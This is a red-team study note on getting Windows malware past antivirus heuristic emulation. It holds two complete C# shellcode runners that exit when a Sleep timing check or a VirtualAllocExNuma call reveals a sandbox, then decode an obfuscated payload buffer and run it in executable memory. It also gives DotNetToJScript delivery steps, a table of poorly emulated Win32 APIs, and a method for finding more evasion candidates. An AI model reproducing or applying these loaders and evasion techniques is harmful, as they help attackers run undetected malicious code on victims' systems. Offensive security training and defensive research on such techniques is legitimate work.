---
title: Behavior-Heuristic Based Detection
draft: false
tags:
  - red-teaming
  - windows
  - av-evasion
  - evasion
  - heuristic-detection
---
 
The strategy to bypass a heuristics scan is to make the malware or stager perform some actions that will execute differently when emulated rather than when they are executed on the client.

If we determine that our code is being run in a simulator, we can simply exit the program without executing malware. Otherwise, if the program is executing on the client, we can execute our malicious code, safe from the antivirus program's heuristic detection routine.

# Sleep Timers

If an application is running in a simulator and the heuristics engine encounters a sleep instruction, it will "fast forward" through the delay and resume with the next actions.

To implement this we can make use of the Win32 [_Sleep_](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep) API, which suspends the execution of the calling thread for the amount of time specified. If our program observes the time of day before and after the _Sleep_ call, we can easily determine if the call was fast-forwarded.

1. Write the following C# Code combining signature and heuristic behavior bypasses:
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
            
        [DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);
        
        static void Main(string[] args)
        {
	        // Detect if we are running on sandbox:
	        DateTime t1 = DateTime.Now;
		    Sleep(2000);
		    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
		    if(t2 < 1.5)
		    {
		        return;
		    }
	        
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...
			
			for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

> [!Note]
> This technique bypasses **Windows Defender** and other AVs solutions.

**DotNetToJScript Conversion (course exercise)**

DotNetToJScript serializes a .NET object into a JScript stub that deserialises and executes it in-process inside `wscript.exe`. This means no .exe on disk — only a `.js` file.

Steps:
1. Download [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) and compile it on the Windows dev machine.
2. Create a C# Class Library (not Console App) with the payload in the constructor of the exported class. The class must be `[ComVisible(true)]` and have a public default constructor.
3. Compile the Class Library as a `.dll`.
4. Generate the JScript stub:
```cmd
DotNetToJScript.exe TestClass.dll --lang=Jscript --ver=v4 -o runner.js
```
5. Run and check detection:
```cmd
wscript runner.js
```

> [!Note]
> The generated JScript runner calls `GetObject("script:...")` to deserialize the .NET object. Many AV engines flag this pattern. Combine with an AMSI bypass (see [[Bypassing AMSI in JScript]]) and obfuscate the JScript stub to reduce the detection rate.

> [!Warning]
> OPSEC: `wscript.exe` spawning .NET assembly via COM deserialisation is a behavioural IoC logged by EDR products. Consider [[Process Injection and Migration]] to migrate into a legitimate process immediately after execution.

---
# Non-emulated APIs

Antivirus emulator engines only simulate the execution of most common executable file formats and functions. We can attempt to bypass detection with a function (typically a Win32 API) that is either incorrectly emulated or is not emulated at all.

The idea is to test out various APIs against the AV engine. When the AV emulator encounters a **non-emulated API,** its execution will fail. In these cases, our malicious program will have a chance to detect AV emulation by simply testing the API result and comparing it with the expected result.

For example, the Win32 [_VirtualAllocExNuma_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma) API allocates memory just like _VirtualAllocEx_ but it is optimized to be used with a specific CPU (we dont care about the optimization). 

> [!Note]
> There is no "master list" for obscure APIs, but browsing APIs on MSDN and reading about their intended purposes may provide clues as to how common they may be.

1. Write the C# Code to test a strange Win32 API. If the API is not emulated and the code is run by the AV emulator, it will not return a valid address.
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
            
        // Sandbox testing necessary libraries:
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
        
        static void Main(string[] args)
        {
	        // Detect if we are running on sandbox:
	        // try to allocate memory on the first CPU (0)
		    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
		    
		    // if the Win32 API doesnt work, it means that its not being emulated by the AV emulator and we are being sandboxed:
			if(mem == null)
			{
			    return;
			}
	        
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...
			
			for(int i = 0; i < buf.Length; i++)
			{
			    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
			}
			
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

2. Compile the code and test it against the AV.

TODO: Use the Win32 [_FlsAlloc_](https://docs.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc) API to create a heuristics detection bypass.
**Additional Non-Emulated APIs (research notes)**

The following Win32 APIs are known to be poorly or not emulated by common AV engines (based on public research as of 2024). Test each against your target AV before relying on it:

| API | DLL | Notes |
|-----|-----|-------|
| `FlsAlloc` | kernel32 | FLS subsystem; returns `FLS_OUT_OF_INDEXES` when emulated |
| `VirtualAllocExNuma` | kernel32 | NUMA-aware alloc; null on emulation |
| `CreateFiber` | kernel32 | Fiber creation; fiber APIs broadly unemulated |
| `NtQuerySystemInformation` | ntdll | Syscall; many emulators stub it |
| `EnumSystemLocalesA` | kernel32 | Locale enumeration callback; callback not invoked on emulation |
| `GetUserDefaultGeoName` | kernel32 | Geo API; absent in older emulation environments |

Methodology to find new candidates:
1. Open Sysinternals **Process Monitor** and capture a clean run of your shellcode runner under the target AV.
2. Filter for `Process Name = clamscan.exe` (or the AV scanner) and look for `NAME NOT FOUND` or `ACCESS DENIED` results on API calls.
3. Alternatively, use **API Monitor** to diff API calls between native execution and emulated execution — APIs present in one but not the other are candidates.

> [!Warning]
> OPSEC: querying `NtQuerySystemInformation` is itself a detection signal in some EDR products. Prefer kernel32-level APIs over ntdll syscalls where possible.



---
# Related Notes

- [[Antivirus Evasion]] — overview of all detection methods
- [[Signature Based Detection]] — static signature evasion
- [[Bypassing AV in Office]] — VBA + heuristic bypass with sleep timer
- [[Bypassing AMSI in JScript]] — DotNetToJScript delivery
